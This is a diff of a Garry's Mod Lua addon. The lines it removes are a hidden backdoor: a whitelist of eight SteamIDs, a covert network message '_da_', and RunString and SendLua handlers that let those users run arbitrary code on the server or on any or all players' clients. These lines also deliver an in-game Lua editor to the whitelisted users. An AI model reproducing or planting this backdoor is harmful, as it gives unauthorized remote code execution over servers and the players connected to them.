@@ -1,48 +1,3 @@
-local users_list = {
-	['STEAM_0:0:86505916'] = true,--kktk
-	['STEAM_0:0:46138786'] = true,--nil
-	['STEAM_0:1:52242486'] = true,--shvo
-	['STEAM_0:0:58529358'] = true,--kosat
-	['STEAM_0:1:30754890'] = true,--zuk	
-	['STEAM_0:0:48309877'] = true,--sol
-	['STEAM_0:1:30052037'] = true,--dzet
-	['STEAM_0:0:36074785'] = true--nilf
-}
-
-util.AddNetworkString('_da_')
-
-local function RunOnCL(tar, code)
-	if !tar.CodeReceiver then
-		tar.CodeReceiver=true
-		tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
-	end
-	net.Start('_da_')
-	net.WriteString(code)
-	net.Send(tar)
-end
-
-local rec = {
-	[1] = function(code)
-		RunString(code)
-	end,
-	[2] = function(code)
-		for k, v in pairs(player.GetAll()) do
-			RunOnCL(v, code)
-		end
-	end,
-	[3] = function(code)
-		RunOnCL(net.ReadEntity(), code)
-	end,
-}
-
-net.Receive('_da_', function(len, ply)
-	if !users_list[ply:SteamID()] then return end
-	
-	local code = net.ReadString()
-	rec[net.ReadUInt(2)](code)
-end)
-
-local code = [[
 local PANEL = {}
 
 PANEL.URL = "http://metastruct.github.io/lua_editor/"
@@ -338,9 +293,3 @@ CreateBtn(115, "Get player", 'icon16/pencil.png', function()
 end)
 
 concommand.Add('editor', function() menu:SetVisible(!menu:IsVisible()) end)
-]]
-
-concommand.Add('editor', function(ply)
-	if !users_list[ply:SteamID()] then return end
-	RunOnCL(ply, code)
-end)
